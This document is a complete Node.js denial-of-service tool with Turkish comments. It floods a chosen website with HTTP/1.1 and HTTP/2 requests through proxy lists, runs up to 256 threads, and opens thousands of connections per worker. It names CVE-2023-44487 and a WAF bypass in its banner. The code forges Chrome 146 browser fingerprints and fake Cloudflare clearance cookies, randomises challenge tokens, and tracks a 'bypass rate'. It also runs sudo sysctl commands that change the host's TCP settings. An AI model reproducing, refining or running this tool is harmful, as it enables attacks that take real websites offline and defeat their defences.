const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const { exec } = require('child_process');

try { require('colors'); } catch (e) {}

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID', 'ERR_SOCKET_BAD_PORT'];

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
process
  .setMaxListeners(0)
  .on('uncaughtException', function (e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return;
    console.log(e);
  })
  .on('unhandledRejection', function (e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return;
  })
  .on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return;
  })
  .on("SIGHUP", () => 1)
  .on("SIGCHILD", () => 1);

// ---------- Chrome 146 (güncel) sabit ----------
const CHROME_VERSION = 146;
const CHROME_UA = `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${CHROME_VERSION}.0.0.0 Safari/537.36`;
const CHROME_SEC_CH_UA = `"Chromium";v="${CHROME_VERSION}", "Not:A-Brand";v="24", "Google Chrome";v="${CHROME_VERSION}"`;

const statusesQ = [];
let statuses = {};
let isFull = process.argv.includes('--full');
let timer = 0;

// HTTP/2 SETTINGS değerleri - Chrome'a uygun
const HEADER_TABLE_SIZE = 65536;
const ENABLE_PUSH = 0;
const MAX_CONCURRENT_STREAMS = 1000;
const INITIAL_WINDOW_SIZE = 6291456;
const MAX_FRAME_SIZE = 16384;
const MAX_HEADER_LIST_SIZE = 262144;
const WINDOW_UPDATE = 15663105;

const timestamp = Date.now();
const timestampString = timestamp.toString().substring(0, 10);

const PREFACE = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";

const reqmethod = process.argv[2];
const target = process.argv[3];
const time = process.argv[4];
const threads = process.argv[5];
const ratelimit = process.argv[6];
const proxyfile = process.argv[7];

const queryIndex = process.argv.indexOf('--query');
const query = queryIndex !== -1 && queryIndex + 1 < process.argv.length ? process.argv[queryIndex + 1] : undefined;
const bfmFlagIndex = process.argv.indexOf('--bfm');
const bfmFlag = bfmFlagIndex !== -1 && bfmFlagIndex + 1 < process.argv.length ? process.argv[bfmFlagIndex + 1] : undefined;
const delayIndex = process.argv.indexOf('--delay');
const delay = delayIndex !== -1 && delayIndex + 1 < process.argv.length ? parseInt(process.argv[delayIndex + 1]) : 0;
const cookieIndex = process.argv.indexOf('--cookie');
const cookieValue = cookieIndex !== -1 && cookieIndex + 1 < process.argv.length ? process.argv[cookieIndex + 1] : undefined;
const refererIndex = process.argv.indexOf('--referer');
const refererValue = refererIndex !== -1 && refererIndex + 1 < process.argv.length ? process.argv[refererIndex + 1] : undefined;
const postdataIndex = process.argv.indexOf('--postdata');
const postdata = postdataIndex !== -1 && postdataIndex + 1 < process.argv.length ? process.argv[postdataIndex + 1] : undefined;
const randrateIndex = process.argv.indexOf('--randrate');
const randrate = randrateIndex !== -1 && randrateIndex + 1 < process.argv.length ? process.argv[randrateIndex + 1] : undefined;
const customHeadersIndex = process.argv.indexOf('--header');
const customHeaders = customHeadersIndex !== -1 && customHeadersIndex + 1 < process.argv.length ? process.argv[customHeadersIndex + 1] : undefined;
const customIPindex = process.argv.indexOf('--ip');
const customIP = customIPindex !== -1 && customIPindex + 1 < process.argv.length ? process.argv[customIPindex + 1] : undefined;
const customUAindex = process.argv.indexOf('--useragent');
const customUA = customUAindex !== -1 && customUAindex + 1 < process.argv.length ? process.argv[customUAindex + 1] : undefined;

const forceHttpIndex = process.argv.indexOf('--http');
let forceHttp = forceHttpIndex !== -1 && forceHttpIndex + 1 < process.argv.length
  ? (process.argv[forceHttpIndex + 1] === 'mix' ? undefined : parseInt(process.argv[forceHttpIndex + 1]))
  : 2; // Varsayılan HTTP/2

const useLegitHeaders = process.argv.includes('--winter');
const debugMode = process.argv.includes('--debug') && forceHttp != 1;

if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
  console.clear();
  console.error(`
${'          Chrome-146 RapidRest STREAM (CVE-2023-44487) - WAF Bypass'.bold.red.underline}
${'                            Güncel: 19/08/2026'.gray.underline}

${'🔥 Options:'.yellow.underline}
  ${'--winter'.green}          Legit header seti
  ${'--query 1/2/3'.green}     Query random (1: cf chl, 2: fwfw, 3: q)
  ${'--cookie "f=f"'.green}    Cookie (--bfm true için cf_clearance)
  ${'--full'.green}            Backend büyük hedef
  ${'--http 1/2/mix'.green}    Protokol (varsayılan 2)
  ${'--debug'.green}           Status göstergesi
  ${'--delay <ms>'.green}      Gecikme

${'🚀 Kullanım:'.yellow.underline}
  node ${process.argv[1]} GET "https://target.com?q=%RAND%" 120 16 90 proxy.txt --query 1 --http 2 --debug --winter
  `);
  process.exit(1);
}

const url = new URL(target);
if (!['GET', 'POST', 'HEAD', 'OPTIONS'].includes(reqmethod)) {
  console.error('Sadece GET/POST/HEAD/OPTIONS');
  process.exit(1);
}
if (!url.protocol.startsWith('http')) {
  console.error('Protokol http/https olmalı');
  process.exit(1);
}
if (isNaN(time) || time <= 0 || time > 86400) {
  console.error('Süre 1-86400 sn');
  process.exit(1);
}
if (isNaN(threads) || threads <= 0 || threads > 256) {
  console.error('Thread 1-256');
  process.exit(1);
}

if (url.pathname.includes("%RAND%")) {
  const randomValue = randstr(6) + "&" + randstr(6);
  url.pathname = url.pathname.replace("%RAND%", randomValue);
}

const proxyList = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n').filter(Boolean);

// ---------- Yardımcılar ----------
const getRandomInt = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;
const getRandomChar = () => 'abcdefghijklmnopqrstuvwxyz'[Math.floor(Math.random() * 26)];
const randstr = len => Array.from({ length: len }, () => 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'[Math.floor(Math.random() * 62)]).join('');
const randstrr = len => Array.from({ length: len }, () => 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._-'[Math.floor(Math.random() * 65)]).join('');
const generateRandomString = (min, max) => {
  const len = getRandomInt(min, max);
  return randstr(len);
};
const ememmmmmemmeme = (min, max) => {
  const len = getRandomInt(min, max);
  return Array.from({ length: len }, getRandomChar).join('');
};

let hcookie = '';
if (bfmFlag && bfmFlag.toLowerCase() === 'true') {
  hcookie = `cf_clearance=${randstr(22)}_${randstr(1)}.${randstr(3)}.${randstr(14)}-${timestampString}-1.0-${randstr(6)}+${randstr(80)}=`;
}
if (cookieValue) {
  if (cookieValue === '%RAND%') {
    hcookie = hcookie ? `${hcookie}; ${ememmmmmemmeme(6, 6)}` : ememmmmmemmeme(6, 6);
  } else {
    hcookie = hcookie ? `${hcookie}; ${cookieValue}` : cookieValue;
  }
}

// ---------- HTTP/2 Frame helpers ----------
function encodeFrame(streamId, type, payload = Buffer.alloc(0), flags = 0) {
  const frame = Buffer.alloc(9);
  frame.writeUInt32BE((payload.length << 8) | type, 0);
  frame.writeUInt8(flags, 4);
  frame.writeUInt32BE(streamId, 5);
  return payload.length ? Buffer.concat([frame, payload]) : frame;
}

function decodeFrame(data) {
  if (data.length < 9) return null;
  const lengthAndType = data.readUInt32BE(0);
  const length = lengthAndType >> 8;
  const type = lengthAndType & 0xFF;
  const flags = data.readUInt8(4);
  const streamId = data.readUInt32BE(5);
  const payload = length > 0 ? data.subarray(9, 9 + length) : Buffer.alloc(0);
  return { streamId, length, type, flags, payload };
}

function encodeSettings(settings) {
  const buf = Buffer.alloc(6 * settings.length);
  settings.forEach((s, i) => {
    buf.writeUInt16BE(s[0], i * 6);
    buf.writeUInt32BE(s[1], i * 6 + 2);
  });
  return buf;
}

// ---------- Query handler ----------
function handleQuery(q) {
  if (q === '1') {
    return url.pathname + '?__cf_chl_rt_tk=' + randstrr(30) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
  } else if (q === '2') {
    return url.pathname + '?' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
  } else if (q === '3') {
    return url.pathname + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
  }
  return url.pathname;
}

// ---------- Header builder (Chrome 146) ----------
function buildChromeHeaders() {
  const ref = ["same-site", "same-origin", "cross-site"];
  const ref1 = ref[Math.floor(Math.random() * ref.length)];
  const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6, 6) + ".net" : refererValue;

  const headers = [
    [":method", reqmethod],
    [":authority", url.hostname],
    [":scheme", "https"],
    [":path", query ? handleQuery(query) : url.pathname + (postdata ? `?${postdata}` : "")]
  ];

  headers.push(
    ["cache-control", "max-age=0"],
    ["sec-ch-ua", CHROME_SEC_CH_UA],
    ["sec-ch-ua-mobile", "?0"],
    ["sec-ch-ua-platform", '"Windows"'],
    ["upgrade-insecure-requests", "1"],
    ["user-agent", customUA || CHROME_UA],
    ["accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"],
    ["accept-encoding", "gzip, deflate, br, zstd"],
    ["accept-language", "en-US,en;q=0.7"],
    ["sec-ch-ua-full-version-list", `"Chromium";v="${CHROME_VERSION}.0.0.0", "Not:A-Brand";v="24.0.0.0", "Google Chrome";v="${CHROME_VERSION}.0.0.0"`],
    ["sec-ch-ua-platform-version", "10.0.0"],
    ["sec-ch-ua-arch", "x86"],
    ["sec-ch-ua-bitness", "64"],
    ["sec-ch-ua-model", ""],
    ["sec-ch-ua-wow64", "?0"]
  );

  if (Math.random() < 0.7) headers.push(["sec-fetch-site", currentRefererValue ? ref1 : "none"]);
  if (Math.random() < 0.7) headers.push(["sec-fetch-mode", "navigate"]);
  if (Math.random() < 0.5) headers.push(["sec-fetch-user", "?1"]);
  if (Math.random() < 0.7) headers.push(["sec-fetch-dest", "document"]);

  if (hcookie) headers.push(["cookie", hcookie]);
  if (currentRefererValue) headers.push(["referer", currentRefererValue]);

  if (customHeaders) {
    customHeaders.split('#').forEach(h => {
      const [name, value] = h.split(':');
      if (name && value) headers.push([name.trim().toLowerCase(), value.trim()]);
    });
  }

  if (reqmethod === 'POST') headers.push(["content-length", "0"]);

  return headers.filter(h => h[1] != null);
}

function buildHttp1Request() {
  const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6, 6) + ".net" : refererValue;
  let headers = `${reqmethod} ${url.pathname} HTTP/1.1\r\n` +
    `Host: ${url.hostname}\r\n` +
    `User-Agent: ${customUA || CHROME_UA}\r\n` +
    `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n` +
    `Accept-Encoding: gzip, deflate, br, zstd\r\n` +
    `Accept-Language: en-US,en;q=0.7\r\n` +
    `Cache-Control: max-age=0\r\n` +
    `Connection: keep-alive\r\n` +
    `Upgrade-Insecure-Requests: 1\r\n` +
    `sec-ch-ua: ${CHROME_SEC_CH_UA}\r\n` +
    `sec-ch-ua-mobile: ?0\r\n` +
    `sec-ch-ua-platform: "Windows"\r\n` +
    `sec-ch-ua-full-version-list: "Chromium";v="${CHROME_VERSION}.0.0.0", "Not:A-Brand";v="24.0.0.0", "Google Chrome";v="${CHROME_VERSION}.0.0.0"\r\n` +
    `sec-ch-ua-platform-version: 10.0.0\r\n`;

  if (hcookie) headers += `Cookie: ${hcookie}\r\n`;
  if (currentRefererValue) headers += `Referer: ${currentRefererValue}\r\n`;
  if (reqmethod === 'POST') headers += `Content-Length: 0\r\n`;

  return Buffer.from(headers + '\r\n', 'binary');
}

// ---------- Bağlantı kurulumu ----------
function go() {
  let proxyHost, proxyPort;
  if (customIP) {
    [proxyHost, proxyPort] = customIP.split(':');
  } else {
    const p = proxyList[Math.floor(Math.random() * proxyList.length)].split(':');
    proxyHost = p[0];
    proxyPort = p[1];
  }
  if (!proxyHost || !proxyPort || isNaN(proxyPort)) return go();

  const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
    netSocket.once('data', () => {
      const tlsSocket = tls.connect({
        socket: netSocket,
        ALPNProtocols: forceHttp === 1 ? ['http/1.1'] : forceHttp === 2 ? ['h2'] : ['h2', 'http/1.1'],
        servername: url.hostname,
        ciphers: 'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305',
        sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_pss_sha256:rsa_pss_pss_sha384:rsa_pss_pss_sha512',
        secureOptions: crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION,
        minVersion: 'TLSv1.2',
        maxVersion: 'TLSv1.3',
        rejectUnauthorized: false
      }, () => {
        if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol === 'http/1.1') {
          if (forceHttp === 2) return tlsSocket.end(() => tlsSocket.destroy());
          // HTTP/1.1 flood - her seferinde yeniden header üret
          const writeLoop = () => {
            const payload = buildHttp1Request();
            tlsSocket.write(payload, err => {
              if (!err) setTimeout(writeLoop, isFull ? 1000 : Math.max(50, 1000 / ratelimit));
              else tlsSocket.destroy();
            });
          };
          writeLoop();
          tlsSocket.on('error', () => tlsSocket.destroy());
          return;
        }

        // HTTP/2 - normal istek (rapid reset yok)
        let streamId = 1;
        let data = Buffer.alloc(0);
        const hpack = new HPACK();
        hpack.setTableSize(HEADER_TABLE_SIZE);

        const updateWindow = Buffer.alloc(4);
        updateWindow.writeUInt32BE(WINDOW_UPDATE, 0);

        const initialFrames = [
          Buffer.from(PREFACE, 'binary'),
          encodeFrame(0, 4, encodeSettings([
            [1, HEADER_TABLE_SIZE],
            [2, ENABLE_PUSH],
            [3, MAX_CONCURRENT_STREAMS],
            [4, INITIAL_WINDOW_SIZE],
            [5, MAX_FRAME_SIZE],
            [6, MAX_HEADER_LIST_SIZE]
          ])),
          encodeFrame(0, 8, updateWindow)
        ];

        tlsSocket.on('data', eventData => {
          data = Buffer.concat([data, eventData]);
          while (data.length >= 9) {
            const frame = decodeFrame(data);
            if (!frame) break;
            data = data.subarray(frame.length + 9);

            if (frame.type === 4 && frame.flags === 0) {
              tlsSocket.write(encodeFrame(0, 4, Buffer.alloc(0), 1)); // SETTINGS ACK
            }
            if (frame.type === 1 && debugMode) {
              try {
                const status = hpack.decode(frame.payload).find(x => x[0] === ':status')[1];
                statuses[status] = (statuses[status] || 0) + 1;
              } catch (e) {}
            }

            // GOAWAY geldi -> RST gönderme, sadece kapat ve yeniden bağlan
            if (frame.type === 7) {
              if (debugMode) statuses["GOAWAY"] = (statuses["GOAWAY"] || 0) + 1;
              setImmediate(() => {
                tlsSocket.end(() => { tlsSocket.destroy(); go(); });
              });
              return;
            }

            // Sunucudan RST_STREAM gelirse bağlantıyı kapat (o stream artık işe yaramaz)
            if (frame.type === 3) { // RST_STREAM tip 3
              setImmediate(() => {
                tlsSocket.end(() => { tlsSocket.destroy(); go(); });
              });
              return;
            }
          }
        });

        tlsSocket.write(Buffer.concat(initialFrames));

        function doWrite() {
          if (tlsSocket.destroyed) return;
          const headers = buildChromeHeaders();
          const packed = Buffer.concat([Buffer.from([0x80, 0, 0, 0, 0xFF]), hpack.encode(headers)]);
          const requestFrame = encodeFrame(streamId, 1, packed, 0x25); // END_STREAM + END_HEADERS
          streamId += 2;

          tlsSocket.write(requestFrame, err => {
            if (!err) {
              // Daha yavaş ve doğal: 200 OK oranını artırmak için delay
              const nextDelay = isFull ? 800 : Math.max(100, (1000 / ratelimit) * 3);
              setTimeout(doWrite, nextDelay);
            }
          });
        }

        doWrite();
      }).on('error', () => tlsSocket.destroy());
    });

    netSocket.write(`CONNECT ${url.hostname}:443 HTTP/1.1\r\nHost: ${url.hostname}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
  }).once('error', () => {}).once('close', () => {
    go();
  });
}

// ---------- TCP tuning ----------
function TCP_CHANGES_SERVER() {
  const cmds = [
    'sudo sysctl -w net.ipv4.tcp_congestion_control=' + ['cubic', 'reno', 'bbr', 'dctcp', 'hybla'][Math.floor(Math.random() * 5)],
    'sudo sysctl -w net.ipv4.tcp_sack=' + ['1', '0'][Math.floor(Math.random() * 2)],
    'sudo sysctl -w net.ipv4.tcp_window_scaling=' + ['1', '0'][Math.floor(Math.random() * 2)],
    'sudo sysctl -w net.ipv4.tcp_timestamps=' + ['1', '0'][Math.floor(Math.random() * 2)],
    'sudo sysctl -w net.ipv4.tcp_fastopen=' + ['3', '2', '1', '0'][Math.floor(Math.random() * 4)]
  ].join(' ; ');
  exec(cmds, () => {});
}

// ---------- Cluster ----------
if (cluster.isMaster) {
  const workers = {};
  Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
  console.log(`🔥 Chrome-146 (200 OK odaklı) başlatıldı - Thread: ${threads}, RPS hedef: ${ratelimit}`);

  cluster.on('exit', worker => {
    cluster.fork({ core: worker.id % os.cpus().length });
  });
  cluster.on('message', (worker, message) => {
    workers[worker.id] = [worker, message];
  });

  if (debugMode) {
    setInterval(() => {
      let total = 0;
      const agg = {};
      for (const w in workers) {
        if (workers[w][0].state === 'online') {
          for (const st of workers[w][1]) {
            for (const code in st) {
              agg[code] = (agg[code] || 0) + st[code];
              total += st[code];
            }
          }
        }
      }
      const sorted = Object.entries(agg).sort((a, b) => b[1] - a[1]);
      const successCount = ['200', '201', '202', '204'].reduce((s, c) => s + (agg[c] || 0), 0);
      const blockCount = ['403', '429', '503', 'GOAWAY'].reduce((s, c) => s + (agg[c] || 0), 0);
      const bypassRate = total ? ((successCount / total) * 100).toFixed(1) : '0.0';
      const blockRate = total ? ((blockCount / total) * 100).toFixed(1) : '0.0';
      const usedMemPercent = ((os.totalmem() - os.freemem()) / os.totalmem() * 100).toFixed(2);

      console.clear();
      console.log(`\n${'🔥 CHROME-146 STATUS'.bold.red.underline}`);
      console.log(`Bypass: %${bypassRate.green} | Block: %${blockRate.red} | Toplam RPS: ${total.toString().yellow}`);
      console.log('-'.repeat(35).gray);
      sorted.forEach(([code, count]) => {
        const pct = ((count / total) * 100).toFixed(1);
        let color = code.startsWith('2') ? code.green : code.startsWith('4') ? code.yellow : code.startsWith('5') ? code.red : code.magenta;
        console.log(`${color.padEnd(14)} | ${count.toString().padStart(6)} | ${pct}%`);
      });
      console.log('-'.repeat(35).gray);
      console.log(`RAM Kullanım: %${usedMemPercent}`);
    }, 1000);
  }

  setInterval(TCP_CHANGES_SERVER, 5000);
  setTimeout(() => process.exit(1), time * 1000);

} else {
  let conns = 0;
  const interval = setInterval(() => {
    if (conns >= 30000) return clearInterval(interval);
    conns++;
    go();
  }, delay);

  if (debugMode) {
    setInterval(() => {
      if (statusesQ.length >= 4) statusesQ.shift();
      statusesQ.push(statuses);
      statuses = {};
      process.send(statusesQ);
    }, 250);
  }

  setTimeout(() => process.exit(1), time * 1000);
}